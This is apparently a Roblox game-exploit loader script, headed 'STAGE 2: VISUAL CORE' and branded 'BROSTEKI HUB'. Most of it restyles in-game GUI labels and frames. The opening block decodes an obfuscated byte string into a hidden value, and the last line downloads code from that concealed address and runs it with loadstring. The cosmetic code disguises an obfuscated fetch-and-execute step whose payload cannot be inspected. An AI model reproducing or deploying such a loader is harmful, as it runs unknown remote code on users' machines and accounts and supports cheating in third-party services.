
--[[ STAGE 2: VISUAL CORE ]]
local JHAmLgTKdaOl6KHBce_="\052\074\076\082\089\036\033\043\114\101\129\060\125\133\148\146\167\148\179\183\175\188\181\203\206\218\211\220\232\168\229\251\255\199\010\019\022\013\035\029\047\037\058\071\056\015\070\088\091\091\101\123\107\122\124\075\143\133\151\156\101\132\167\177\184\180\206\197\203\219\209\188\232\253\233\231\249\012\015\026\032\023\013\051\063\060\053\061\061\024\078\037\042\050\055\057\065\064\132\149\139"local GhaFVTH1XrqnnuTxe=131 local a2zDH5Gg7uil=61 local OuYWOgNyZmZ8koK5=1 local KyI4AKEffU7vnw=6 local GTVSwLKHQRXNCm3bKf0=12 local AoH3rdbzOkWZX=false local z3mrfKmaO6N6M=bit32 and bit32.bxor if not z3mrfKmaO6N6M then z3mrfKmaO6N6M=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local Lcta9oSDX8EsAsWaRAqh={}for X9svtNSRdmBP=1,#JHAmLgTKdaOl6KHBce_ do local vJMe3wco9wcw9tP1k5_=string.byte(JHAmLgTKdaOl6KHBce_,X9svtNSRdmBP)local FacFMhTsEgKsw=(a2zDH5Gg7uil+(X9svtNSRdmBP*KyI4AKEffU7vnw)+GTVSwLKHQRXNCm3bKf0)%256 if OuYWOgNyZmZ8koK5==0 then vJMe3wco9wcw9tP1k5_=(vJMe3wco9wcw9tP1k5_-FacFMhTsEgKsw)%256 Lcta9oSDX8EsAsWaRAqh[X9svtNSRdmBP]=string.char(z3mrfKmaO6N6M(vJMe3wco9wcw9tP1k5_,GhaFVTH1XrqnnuTxe))else vJMe3wco9wcw9tP1k5_=z3mrfKmaO6N6M(vJMe3wco9wcw9tP1k5_,GhaFVTH1XrqnnuTxe)Lcta9oSDX8EsAsWaRAqh[X9svtNSRdmBP]=string.char((vJMe3wco9wcw9tP1k5_-FacFMhTsEgKsw)%256)end end local vHH1Q2C1DgOs1oVrx=table.concat(Lcta9oSDX8EsAsWaRAqh)if AoH3rdbzOkWZX then vHH1Q2C1DgOs1oVrx=string.reverse(vHH1Q2C1DgOs1oVrx)end local rXIlOtD8lopoGQWcW1j=vHH1Q2C1DgOs1oVrx
local HubName = "BROSTEKI HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(rXIlOtD8lopoGQWcW1j))()
